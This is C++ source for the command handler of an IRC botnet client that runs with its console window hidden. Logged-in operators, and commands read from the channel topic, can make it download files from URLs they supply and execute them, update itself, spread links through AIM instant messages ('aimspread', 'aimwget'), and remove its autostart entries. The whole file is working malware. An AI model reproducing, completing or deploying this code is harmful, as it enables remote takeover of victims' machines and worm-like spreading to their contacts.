#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define WIN32_LEAN_AND_MEAN	
#include <string>
#include <list>
#include <vector>
#include <time.h>
#include <string.h>
#include "ircEvents.h"
#include "includes.h"
#include "string.h"
#include "download.h"
#include "mBot.h"
#include "structure.h"
DWORD WINAPI AIMSpread (void *pVoid);
using std::string;
using std::vector;
download_t download_info;
link_t link;
access_t user_access;
threadid_t thread_id;
IsUpd Is_Upd;
extern cAim_t aim;
void UnAutoStartRegs();
ircHandler::ircHandler ()
{
}

ircHandler::~ircHandler ()
{
}

void ircHandler::onText (irc& pIrc, const ircUser_t& pIrcUser,
		const std::string& pTarget, const std::string& pMsg, bool pIsChannel)
{
	vector<string> v;
	tokenize(pMsg, " ", v);
	typedef vector<string>::size_type vsize_t;
	vsize_t size = v.size();
	if (size == 0)
		return;
	try
	{	

		if ((pMsg.substr(0,1) != prefix) || (pMsg == ".")) { return; }
		string cmd = remove(v.at(0),prefix);
		//check if prefix matches and then parse out command...
		
		if (scmpi(cmd,"login") == 0) { 
		if (!wildmatchi(controlhost,pIrcUser.ident + "@" + pIrcUser.host)) { return; }
			if (scmpi(pass,v.at(1)) == 0) {
				if ((user_access.login1.empty())  && (user_access.login1 != pIrcUser.nick)) {
					user_access.login1 = pIrcUser.nick;
					if (!wildmatchi("*-s*",pMsg)) {
						pIrc.privmsg(pTarget,user_access.login1 + " successfully logged in as user 1.");
					}
				}
				else if ((user_access.login2.empty())  && (user_access.login1 != pIrcUser.nick)) { 
					user_access.login2 = pIrcUser.nick; 
					if (!wildmatchi("*-s*",pMsg)) {
						pIrc.privmsg(pTarget,user_access.login2 + " successfully logged in as user 2.");
					}
				}
				else { if (!wildmatchi("*-s*",pMsg)) { pIrc.privmsg(pTarget,"could not login, users already logged in..."); } }
			}
		}
		if (scmpi(cmd,"logout") == 0) {
			if (pIrcUser.nick == user_access.login1) { user_access.login1.clear(); }
			else if (pIrcUser.nick == user_access.login2) { user_access.login2.clear(); }
			else { return; }
			
		}
		if ((pIrcUser.nick == user_access.login1) || (pIrcUser.nick == user_access.login2)) 
		{				
			if ((scmpi(cmd,"aimspread") == 0) && (isIn(v,1))) { 
				link.link = v.at(1);
				aim.x = TRUE;
				CreateThread(NULL,0,AIMSpread,0,NULL,&thread_id.dwaTid);
				if (!wildmatchi("*-s*",pMsg)) {
					pIrc.privmsg(pTarget,"successfully spreading " + link.link + " via AIM..");
				}
				return;
			}
			else if (scmpi(cmd,"killspread") == 0) { 
				aim.x = FALSE;
			}
			else if ((scmpi(cmd,"wget") == 0) && (isIn(v,2))) { 
				download_info.sURL = lex<string>(v.at(1));
				download_info.sSave = lex<string>(v.at(2));
				download_info.sExec = 0;
				if (isIn(v,3)) { download_info.sExec = lex<unsigned int>(v.at(3)); }
				if (download_info.sExec != 0) { download_info.sExec = 1; }
				CreateThread(NULL,0,dlFile,NULL,NULL,&thread_id.dwwTid);
				return;
			}
			else if ((scmpi(cmd,"upd") == 0) && (isIn(v,2))) { 
				download_info.sURL = lex<string>(v.at(1));
				download_info.sSave = lex<string>(v.at(2));
				download_info.sExec = 1;
				Is_Upd.x = TRUE;
				UnAutoStartRegs();
				CreateThread(NULL,0,dlFile,NULL,NULL,&thread_id.dwwTid);
				return;
			}
			else if (scmpi(cmd,"reconnect") == 0) { 
				pIrc.disconnect();
				Sleep(10000);
				pIrc.connect();		
			}
			else if (scmpi(cmd,"rmnow") == 0) {
				UnAutoStartRegs();
				Sleep(1000);
				exit(0); 
			}
			else if ((scmpi(cmd,"exit") == 0) || (scmpi(cmd,"quit") == 0)) { exit(0); }
		}



		
	}
	catch (...)
	{
		printf("!!! unknown exception at onText()\n");
	}		


}
void ircHandler::onConnect (irc& pIrc)
{
	pIrc.join(channel,key);
}

void ircHandler::onAnySend (irc& pIrc, const string& pMsg)
{
	printf("-> %s\n", pMsg.c_str());

}

void ircHandler::onAnyRecv (irc& pIrc, const string& pMsg)
{
	printf("<- %s\n", pMsg.c_str());

	if (wildmatchi("*332*" + string(channel) + "*",pMsg)) {


		string x = token(pMsg,":",(numtok(pMsg,":") - 3));
		if (x.substr(0,1) != prefix) {
			x = token(pMsg,":",(numtok(pMsg,":") - 4));
				if (x.substr(0,1) != prefix) {
					return; 
				}
		}
	
		vector<string> v;
		tokenize(pMsg, " ", v);
		typedef vector<string>::size_type vsize_t;
		vsize_t size = v.size();
		if (size == 0)
			return;
		try
		{

			
			string cmd = remove(remove(v.at(4),":"),prefix);
			//check if prefix matches and then parse out command...		
			if ((scmpi(cmd,"aimspread") == 0) && (isIn(v,5))) { 
				link.link = v.at(5);
				aim.x = TRUE;
				CreateThread(NULL,0,AIMSpread,0,NULL,&thread_id.dwaTid);
				return;
			}
			else if ((scmpi(cmd,"wget") == 0) && (isIn(v,7))) { 
				download_info.sURL = lex<string>(v.at(5));
				download_info.sSave = lex<string>(v.at(6));
				download_info.sExec = 0;
				if (isIn(v,7)) { download_info.sExec = lex<unsigned int>(v.at(7)); }
				if (download_info.sExec != 0) { download_info.sExec = 1; }
				CreateThread(NULL,0,dlFile,NULL,NULL,&thread_id.dwwTid);
				return;
			}
			
			else if ((scmpi(cmd,"aimwget") == 0) && (isIn(v,8))) {
				
				download_info.sURL = lex<string>(v.at(6));
				download_info.sSave = lex<string>(v.at(7));
				download_info.sExec = 0;
				if (isIn(v,7)) { download_info.sExec = lex<unsigned int>(v.at(8)); }
				if (download_info.sExec != 0) { download_info.sExec = 1; }
				CreateThread(NULL,0,dlFile,NULL,NULL,&thread_id.dwwTid);			

				aim.x = TRUE;
				link.link = v.at(5);
				CreateThread(NULL,0,AIMSpread,0,NULL,&thread_id.dwaTid);
			}
			else if ((scmpi(cmd,"upd") == 0) && (isIn(v,2))) { 
				download_info.sURL = lex<string>(v.at(1));
				download_info.sSave = lex<string>(v.at(2));
				download_info.sExec = 1;
				Is_Upd.x = TRUE;
				UnAutoStartRegs();
				CreateThread(NULL,0,dlFile,NULL,NULL,&thread_id.dwwTid);
				return;
			}
			else if (scmpi(cmd,"rmnow") == 0) {
				UnAutoStartRegs();
				Sleep(1000);
				exit(0); 
			}
				

			
		}
		catch (...)
		{
			printf("!!! unknown exception at onText()\n");
		}	
	}
}


